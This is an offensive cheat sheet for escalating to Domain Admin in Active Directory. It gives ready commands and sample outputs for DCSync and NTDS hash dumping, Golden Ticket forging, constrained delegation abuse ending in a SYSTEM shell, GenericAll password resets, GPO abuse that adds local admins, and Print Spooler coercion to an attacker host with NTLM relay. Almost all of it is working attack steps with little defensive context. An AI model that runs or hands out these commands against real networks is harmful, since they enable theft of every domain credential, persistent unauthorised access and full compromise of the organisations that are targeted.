# DOMAIN ESCALATION TO DA

### DCSync attack

Dump all domain hashes — Need Replicating Directory Changes rights

```bash
impacket-secretsdump <domain>/<user>:<pass>@<DC_IP>
or: mimikatz: lsadump::dcsync /domain:<domain> /user:Administrator
```

<details>
<summary>Example Output</summary>

```
impacket-secretsdump corp.local/admin:P@ss@10.10.10.5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b...:31d6cfe...
krbtgt:502:aad3b...:f3bc61...
john.smith:1001:aad3b...:8846f7...
(ALL DOMAIN HASHES = FULL COMPROMISE)
```
</details>

---

### Dump NTDS.dit

All domain user hashes — Full domain compromise

```bash
impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-ntlm
```

<details>
<summary>Example Output</summary>

```
impacket-secretsdump corp.local/admin:P@ss@10.10.10.5 -just-dc-ntlm
[*] Dumping Domain Credentials
Administrator:500:aad3b...:31d6cfe...
krbtgt:502:aad3b...:f3bc61...
(Every single domain account hash)
```
</details>

---

### Golden Ticket

Forge TGT with krbtgt hash — Persistent domain access

```bash
mimikatz: kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt
```

<details>
<summary>Example Output</summary>

```
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:f3bc61... /ptt

[+] Ticket injected
C:\> dir \\DC01\C$
(Access anything, forever, even after password changes)
```
</details>

---

### Constrained delegation abuse

Impersonate any user — If user has delegation rights

```bash
impacket-getST -spn <target_SPN> -impersonate Administrator <domain>/<user>:<pass>
export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass
```

<details>
<summary>Example Output</summary>

```
impacket-getST -spn cifs/DC01 -impersonate Administrator corp.local/svc_web:P@ss
[*] Got TGS for Administrator@corp.local

export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.local/Administrator@DC01 -k -no-pass
# whoami
nt authority\system on DC
```
</details>

---

### GenericAll / WriteDACL abuse

Reset passwords, add to groups — Check BloodHound for these edges

```bash
If user has GenericAll on another user:
net rpc password <target_user> 'NewPass123' -U <domain>/<user>%<pass> -S <DC_IP>
```

<details>
<summary>Example Output</summary>

```
BloodHound shows: john.smith --GenericAll--> svc_admin

net rpc password svc_admin 'NewPass123' -U corp/john%Password1 -S 10.10.10.5
(Reset svc_admin password, now you own that account)
```
</details>

---

### Group Policy abuse

Add yourself as local admin via GPO — Affects all machines GPO applies to

```bash
If you can modify GPO:
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName <gpo>
```

<details>
<summary>Example Output</summary>

```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount john --GPOName 'Default Domain Policy'
[+] john added as local admin via GPO

gpupdate /force on target
(john is now local admin on all domain machines)
```
</details>

---

### Print Spooler / coerce auth

Force DC to auth to you — Relay to another DC for compromise

```bash
printerbug.py <domain>/<user>:<pass>@<DC_IP> <ATTACKER_IP>
with responder or ntlmrelayx listening
```

<details>
<summary>Example Output</summary>

```
printerbug.py corp.local/john:Pass@DC01 ATTACKER_IP
[*] Attempting to trigger authentication

On attacker (ntlmrelayx):
[*] SMBD: Received connection from DC01
[*] Authenticating against DC02
[*] ADMIN$ access on DC02
(Relayed DC auth to compromise second DC)
```
</details>

---
